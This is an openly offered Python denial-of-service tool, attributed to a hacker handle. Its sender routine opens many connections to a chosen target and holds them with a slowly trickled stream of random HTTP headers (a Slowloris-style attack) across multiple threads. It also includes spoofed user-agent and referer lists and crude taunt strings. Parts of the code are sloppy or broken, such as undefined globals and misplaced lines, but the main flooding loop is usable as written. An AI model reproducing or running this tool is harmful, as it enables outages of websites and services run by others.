# Author  @S0u1 
# https://twitter.com/S0u1_HLoTW 

import os, sys, time
import socket, thread
import random
from threading import Lock
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
msg='SOULIZGODSOULIZGODSOULIZGODSOULIZGODSOULIZGODSOULIZGOD'

COLOR_BLACK     = 0
COLOR_RED       = 1
COLOR_GREEN     = 2
COLOR_YELLOW    = 3
COLOR_BLUE      = 4
COLOR_PINK      = 5
COLOR_CYAN      = 6
COLOR_WHITE     = 7
COLOR_RESET     = 9

def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
	return(headers_useragents)
	


def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')                                     
	headers_referers.append('http://www.usatoday.com/search/results?q=')                      
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        
	headers_referers.append('http://www.google.com/?q=')                                      
	headers_referers.append('http://www.usatoday.com/search/results?q=')                     
	headers_referers.append('http://engadget.search.aol.com/search?q=')                      
	headers_referers.append('http://www.bing.com/search?q=')                                   
	headers_referers.append('http://search.yahoo.com/search?p=')                               
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')

	
def keyword_list():
        global keyword_top
        keyword_top.append('S0u1izG0d')
        keyword_top.append('EatthisPussy')
        keyword_top.append('You Can Add Random Shit here lmao')
        keyword_top.append('Pussy')
        keyword_top.append('Hacking Liberations of The World')
        keyword_top.append('I fuck you up')
        keyword_top.append('Ebola')
        keyword_top.append('Knock Knock')
        keyword_top.append('Toast')
        keyword_top.append('Sorry.. Not')
        keyword_top.append('Dirty Bitch')
        keyword_top.append('Rachet Mother fuckers')
        keyword_top.append('Wild and Wet')
        keyword_top.append('1337')
        keyword_top.append('13333333333338')
        keyword_top.append('Dos')
        keyword_top.append('Hacker')
        keyword_top.append('DDOS')
        keyword_top.append('Love to fight')
        keyword_top.append('TICK TICK TOCK')
        keyword_top.append('Xbox One')
        keyword_top.append('S0u1')
        keyword_top.append('Elite cough lelelelelelelel')
        keyword_top.append('LulzSec')
        keyword_top.append('TAKE EM DOWN PEW PEW PEW')
        keyword_top.append('Anonymous')
        keyword_top.append('LLLLLLLLUUUUUUUUUUUUUUULLLLLLLLLLLLZZZZZZZZZZZZZSSSSSSSSSSEEEEEEEEEEEEECCCCCCC')

	headers_referers.append('http://' + host + '/')
	return(headers_referers)

def inc_counter():
	global request_counter
	request_counter+=45

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1

def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 160)
		out_str += chr(a)
	return(out_str)

 
 
# Got this from a file I had lmao 
host = None
num_threads = 6
port = 80
dead = False
path = "/"
connection_amount = 20
 
 
 
def out (n):
        sys.stdout.write(n)
def reset_effects ():
        out("\x1b[0m")
 
def exit ():
        reset_effects()
        print ""
        sys.exit(0)
 
def helptext ():
        print "Usage: %s is 1.1 for GNU/Linux - <hostname> [-t] [-c] [-p]\n" % sys.argv[0]
        print " EX. python NewGeneration.py target.com -t 1000 -c 1000 -p 80"
        print "     ________________        ____  .___           _______________       .___    "
        print "    /   _____/\   _  \  __ _/_   | |   |_______  /  _____/\   _  \    __| _/    "
        print "    \_____  \ /  /_\  \|  |  \   | |   \___   / /   \  ___/  /_\  \  / __ |     "
        print "    /        \\  \_/   \  |  /   | |   |/    /  \    \_\  \  \_/   \/ /_/ |     "
        print "   /_______  / \_____  /____/|___| |___/_____ \  \______  /\_____  /\____ |     "
        print "           \/        \/                      \/         \/       \/      \/     "
        print ""
        print " HTTP method"
        print ""
        print "   -t\t\tSet number of threads"
        print "   -c\t\tSet number of connections per thread"
        print "   -p\t\tSet host port number"
        print "   -u\t\tSet UDP port number"
        print ""
        print " NEW UPDATE! UDP SENDER! "
        print ""
        print " FB https://twitter.com/S0u1_HLoTW : S0u1"
        exit()
 #From Hulk
def main (args):
        global host, port, num_threads, connection_amount
        pname = args[0]
        i = 1
        if len(args) == 1:
                helptext()
        while i < len(args):
                a = args[i]
               
                if a == "--help":
                        helptext()
                elif a == "-t":
                        i += 1 #Threads
                        num_threads = int(args[i])
                elif a == "-p": #Port test
                        i += 1
                        port = int(args[i])
                elif a == "-c":
                        i += 1 #Connection
                        connection_amount = int(args[i])						
                elif host == None:
                        host = args[i]
                elif a == "-u":
                        i += 1
                        #This is going to be the UDP	
                        udp_atk = int(args[i]) 						
                else:
                        print "Invalid argument '%s'" % args[i]
                        exit()
               
                i += 1
        if host == None:
                print "Enter a target"
                exit()
        start()
 
 
 
# I added random thread making here 
def sender (num):
        global dead
       
       
        def col ():
                color = (num % 6) + 1
                out("\x1b[%d;30m%02d\x1b[49;39m" % (color + 40, num)) # Dont edit this please 
       
        col()
        print " * | Sending %d Request" % num
       
        cons = []
       
        
        while True:                          # rapidly connects to server
                soulizgod = False
                for i in range (connection_amount):
                        s = socket.socket()
                        cons += [s]
                        try:
                                s.connect((host, port))
                        except:
                                col()
                                print " # | - ERROR IN THREAD %d: COULD NOT CONNECT" % num
                                soulizgod = True
                if soulizgod:
                        continue
                               
                col()
                print " O | Thread %d opened %d connections" % (num, connection_amount)
              
                header = "GET %s HTTP/1.1\r\n" % path
                fulldata  = "Host: localhost\r\n"
                fulldata += "User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\r\n"
                fulldata += "Accept-Language: en-US,en;q=0.8\r\n"
                fulldata += "\r\n"
               
               
                try:
                        for c in cons:
                                c.send(header + fulldata)
                except:
                        soulizgod = True
               
                i = 0
                cap = 100
                while i < cap and not soulizgod:
                        # send random headers that don't mean anything to me but effective  lulz 
                        data  = chr(65 + int(random.random() * 26))
                        data += chr(97 + int(random.random() * 26)) + chr(97 + int(random.random() * 26))
                        data += ": "
                        data += chr(65 + int(random.random() * 26)) + chr(97 + int(random.random() * 26)) + chr(97 + int(random.random() * 26))
                        data += chr(97 + int(random.random() * 26)) + chr(97 + int(random.random() * 26)) + chr(97 + int(random.random() * 26))
                        i += 1
                        for c in cons:
                                try:
                                        c.send(data)
                                except:
                                        soulizgod = True
                        col()
                        print " > | Thread %d sent some data (%d/%d)" % (num, i, cap)
                       
                        # wait three seconds between each header.. o.O Lowest you can go is 1 :) ENJOY dont crash you computer -_-
                        time.sleep(3)
               
                # if something went wrong
                if soulizgod:
                        for c in cons:
                                try:
                                        c.close()
                                except:
                                        pass
                        col()
                        print " X | :( < Sad face  Thread %d soulizgod, restart" % num
                        cons = []
                        continue
               
                #Some how nothing gone wrong after 100 headers so I didnt take it off  ( I should take this message out but idk :P )
                time.sleep(2)
                for c in cons:
                        c.close()
                cons = []
                col()
                print " < | Thread %d closed all connections" % num
 
 
def start ():
        # show a banner :P
        print "/------------------------------------------------------\\"
        h_on  = "\x1b[37;1m"
        h_off = "\x1b[39;22m"
       
        print " Targeting %s%s%s at port %s%d%s using %s%d%s threads" % (h_on, host, h_off, h_on, port, h_off, h_on, num_threads, h_off)
       
        print "\\------------------------------------------------------/"
       
        time.sleep(1)
       
        # start threads
        for i in range(num_threads):
                thread.start_new_thread(sender,(i,))
                time.sleep(0.1) # If I were you I would not edit this ...
       
        try:
                while not dead: pass
        except KeyboardInterrupt:
                print "\n\n - TERMINATING THE TOOL > Caught <Ctrl - C>\n"
                exit()
 
 

main(sys.argv)

exit()
